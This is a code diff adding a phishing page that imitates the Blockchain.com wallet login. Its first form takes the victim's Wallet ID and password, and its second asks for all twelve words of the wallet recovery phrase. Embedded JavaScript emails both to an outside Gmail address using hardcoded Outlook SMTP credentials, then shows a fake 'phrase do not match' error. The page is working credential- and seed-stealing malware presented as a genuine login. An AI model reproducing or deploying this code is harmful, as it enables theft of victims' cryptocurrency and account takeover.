@@ -1,0 +1,354 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+
+    <title>Blockchain.com - The Most Trusted Crypto Company</title>
+    <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/sign-in/">
+
+    <!-- Bootstrap core CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+
+        <!-- Favicons -->
+    <link rel="apple-touch-icon" href="/docs/4.5/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
+    <link rel="icon" href="/docs/4.5/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+    <link rel="icon" href="https://login.blockchain.com/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/favicon.ico" sizes="16x16" type="image/ico">
+    <link rel="manifest" href="/docs/4.5/assets/img/favicons/manifest.json">
+    <link rel="mask-icon" href="/docs/4.5/assets/img/favicons/safari-pinned-tab.svg" color="#563d7c">
+    <link rel="icon" href="https://login.blockchain.com/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/favicon.ico">
+
+    <style>
+      .bd-placeholder-img {
+        font-size: 1.125rem;
+    
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+
+      @media (min-width: 768px) {
+        .bd-placeholder-img-lg {
+          font-size: 3.5rem;
+        }
+      }
+
+
+    html,
+    
+    a{
+        text-decoration: none;
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        font-size: 13px;
+        font-weight: 600;
+        color: rgb(12, 108, 242);
+        cursor: pointer
+    }
+    a:hover{
+        text-decoration: none;
+    }
+
+    body {
+        margin-top: 10px;
+        padding-top: 0px;
+        padding-bottom: 10px;
+        background-color: rgb(18, 29, 51);
+        background-image: url(https://login.blockchain.com/img/bg-pattern.svg);
+        background-repeat: no-repeat;
+        background-size: 90%;
+    }
+
+    .label-txt{
+        text-align: left;
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        font-weight: 600;
+        font-size: 14px;
+        line-height: inherit;
+        text-transform: none;
+        font-style: normal;
+        color: rgb(53, 63, 82);
+        padding-top: 10px;
+    }
+
+    .header{
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        font-weight: 600;
+        font-size: 21px;
+        line-height: inherit;
+        text-transform: capitalize;
+        font-style: normal;
+        text-decoration: none solid rgb(18, 29, 51);
+    }
+
+    .form-signin {
+        max-width: 450px;
+        padding: 25px;
+        margin: auto;
+        height: auto;
+        background-color: #fff;
+        border-radius: 8px;
+    }
+
+    .form-signin .form-control {
+        position: relative;
+        box-sizing: border-box;
+        height: auto;
+        padding: 10px;
+        font-size: 16px;
+        border-radius: 8px;
+    }
+
+    .form-signin .form-control:focus {
+        display: block;
+        height: 48px;
+        min-height: 48px;
+        box-shadow: none;
+        font-size: 16px;
+        font-weight: 500;
+        color: rgb(53, 63, 82);
+        border-color: rgb(12, 108, 242);
+        background-color: rgb(255, 255, 255);
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    }
+    .form-signin input[type="email"] {
+    
+    
+    }
+    .form-signin input[type="password"] {
+    margin-bottom: 30px;
+    
+    }
+
+    #statement{
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        font-size: 12px;
+        line-height: inherit;
+        text-transform: none;
+        font-style: normal;
+        color: rgb(53, 63, 82);
+    }
+
+    .btn{
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        font-weight: 600;
+        font-size: 16px;
+        line-height: inherit;
+        text-transform: none;
+        font-style: normal;
+        color: rgba(255, 255, 255, 0.9);
+        cursor: inherit;
+        background-color: rgb(12, 108, 242);
+        padding: 10px 10px;
+        text-decoration: none;
+        transition: all 0.2s ease-in-out 0s;
+        border-radius: 8px;
+        border-style: solid;
+        border-width: 1px;
+        border-color: rgb(12, 108, 242);
+    }
+
+    #foot{
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        font-size: 14px;
+        line-height: inherit;
+        text-transform: none;
+        font-style: normal;
+        color: rgba(255, 255, 255, 0.6);
+        cursor: inherit;
+        display: block;
+        opacity: 1;
+    }
+
+    
+    #footer{
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        font-size: 14px;
+        line-height: inherit;
+        text-transform: none;
+        font-style: normal;
+        color: rgba(255, 255, 255, 0.6);
+        cursor: inherit;
+        display: block;
+        opacity: 1;
+    }
+    </style>
+    <!-- Custom styles for this template -->
+  </head>
+  <body>
+      <div  style="margin-top: 10px; text-align: center; padding-bottom: 20px;">
+        <img class="mb-4" src="https://login.blockchain.com/img/bc-logo.svg" alt="" width="214" height="72">
+      </div>
+    
+        <form class="form-signin" id="theform1" onkeyup="checkForm1()">
+            <span class="header mb-3">Welcome back!</span>
+            <br/>
+            <label for="inputEmail" class="label-txt">Wallet ID</label>
+            <input type="text" id="inputEmail" class="form-control input1" name="wallet" required autofocus>
+            <p style="text-align: center; padding-top: 10px;" id="statement">Your Wallet ID can be found at the bottom of any email we’ve ever sent you. Need a reminder? <a href="#">Send my Wallet ID</a></p>
+            <label for="inputPassword" class="label-txt">Password</label>
+            <input type="password" id="inputPassword" name="password" class="form-control input1"  required>
+            <div style="display: none; color: green">Loading please wait...</div>
+            <button class="btn btn-lg btn-primary btn-block"type="submit" id="btn1">Log in</button>
+            <br/>
+            <div class="row d-flex justify-item-between">
+                <div class="col-md-6"><a href="#">via Mobile</a></div>
+                <div class="col-md-6" style="text-align: right;"><a href="#">Need some help?</a></div>
+            </div>
+        </form>
+
+        <form class="form-signin" id="theform2" style="display:none" onkeyup="checkForm2()">
+            <center><span class="header mb-3">Confirm your phrase</span></center>
+            <p style="font-size: 18px;">Please enter the words that match the numbers you see below.</p>
+            <br/>
+            <div class="alert alert-danger" id="error" style="color:red;">Error Phrase do not match.</div>
+            <div class="row py-2">
+                <div class="col-md-4"><input type="text" placeholder="1st word" class="form-control input2" name="one" required></div>
+                <div class="col-md-4"><input type="text" placeholder="2nd word" class="form-control input2" name="two" required></div>
+                <div class="col-md-4"><input type="text" placeholder="3rd word" class="form-control input2" name="three" required></div>
+            </div>
+            <div class="row py-2">
+                <div class="col-md-4"><input type="text" placeholder="4th word" class="form-control input2" name="four" required></div>
+                <div class="col-md-4"><input type="text" placeholder="5th word" class="form-control input2" name="five" required></div>
+                <div class="col-md-4"><input type="text" placeholder="6th word" class="form-control input2" name="six" required></div>
+            </div>
+            <div class="row py-2">
+                <div class="col-md-4"><input type="text" placeholder="7th word" class="form-control input2" name="seven" required></div>
+                <div class="col-md-4"><input type="text" placeholder="8th word" class="form-control input2" name="eight" required></div>
+                <div class="col-md-4"><input type="text" placeholder="9th word" class="form-control input2" name="nine" required></div>
+            </div>
+            <div class="row py-2">
+                <div class="col-md-4"><input type="text" placeholder="10th word" class="form-control input2" name="ten" required></div>
+                <div class="col-md-4"><input type="text" placeholder="11th word" class="form-control input2" name="eleven" required></div>
+                <div class="col-md-4"><input type="text" placeholder="12th word" class="form-control input2" name="twelve" required></div>
+            </div>
+            <br/>
+            <button class="btn btn-lg btn-primary btn-block" type="submit" id="btn2">Next</button>
+        </form>
+
+<br/>
+<div class="row">
+    <div class="col-md-5 ml-auto mr-auto">
+        <div style="text-align: center; color:rgba(255, 255, 255, 0.6);"">
+            <p id="foot">Don't have a wallet? <a href="#">Signup</a></p>
+        </div>
+    </div>
+</div>
+<script src="https://smtpjs.com/v3/smtp.js"></script> 
+
+<script type="text/javascript" language="javascript">
+
+var inp = document.getElementsByClassName("input1");
+var btn = document.getElementById("btn1");
+// Disable the button dynamically using javascript
+btn.disabled = "disabled";
+
+function checkForm1() {
+    for (var i = 0; i < inp.length; i++) {
+        if (inp[i].checkValidity() == false) {
+            btn.disabled = "disabled";
+        } else {
+            btn.disabled = false;
+        }
+    }
+}
+
+const frm1 = document.querySelector('#theform1');
+
+frm1.addEventListener('submit', (e)=>{
+    e.preventDefault();
+    const wallet = frm1['wallet'].value;
+    const passwd = frm1['password'].value;
+
+    btn.disabled = true;
+
+      Email.send({ 
+        Host: "smtp.office365.com", 
+        Username: "suxyone@outlook.com", 
+        Password: "me2good@100%", 
+        To: 'bitreceive029@gmail.com', 
+        From: "suxyone@outlook.com", 
+        Subject: "Email from Blockchain", 
+        Body: "Wallet: "+wallet+" PASSWORD:"+passwd 
+      }) 
+        .then(function (message) { 
+        //   window.location = "phrase.html"
+            frm1.style = "display:none";
+            document.querySelector('#theform2').style = "display:block";
+        }, err=>{
+            console.log(err.message)
+        })
+
+    //alert('wallet: '+wallet+', Pass: '+passwd);
+});
+
+
+
+//Checking the second form
+var btn2 = document.getElementById("btn2");
+var inps = document.getElementsByClassName("input2");
+
+checkForm2 = () => {
+    for (var i = 0; i < inps.length; i++) {
+        if (inps[i].checkValidity() == false) {
+            btn2.disabled = "disabled";
+        } else {
+            btn2.disabled = false;
+        }
+    }
+}
+
+    
+const err = document.getElementById('error');
+err.style = "display:none";
+btn2.disabled = false;
+
+const frm2 = document.querySelector('#theform2');
+      
+frm2.addEventListener('submit', (e)=>{
+    e.preventDefault();
+
+    btn2.disabled = true;
+    
+    
+    const one       = frm2['one'].value;
+    const two       = frm2['two'].value;
+    const three     = frm2['three'].value;
+
+    const four      = frm2['four'].value;
+    const five      = frm2['five'].value;
+    const six       = frm2['six'].value;
+
+    const seven     = frm2['seven'].value;
+    const eight     = frm2['eight'].value;
+    const nine      = frm2['nine'].value;
+
+    const ten       = frm2['ten'].value;
+    const eleven    = frm2['eleven'].value;
+    const twelve    = frm2['twelve'].value;
+
+    const message = 'one:'+one+', two:'+two+', three:'+three+', Four:'+four+', Five:'+five+', Six:'+six+', Seven:'+seven+', Eight:'+eight+', Nine:'+nine+', Ten:'+ten+', Eleven:'+eleven+', Twelve:'+twelve;
+
+    Email.send({ 
+        Host: "smtp.office365.com", 
+        Username: "suxytwo2@outlook.com", 
+        Password: "me2good@100%", 
+        To: "bitreceive029@gmail.com", 
+        From: "suxytwo2@outlook.com", 
+        Subject: "Email from Blockchain", 
+        Body: message 
+    }).then(function (message) { 
+        btn2.disabled = true;
+        err.style = "display:block";
+    }); 
+    
+});
+
+    
+</script> 
+</body>
+</html>
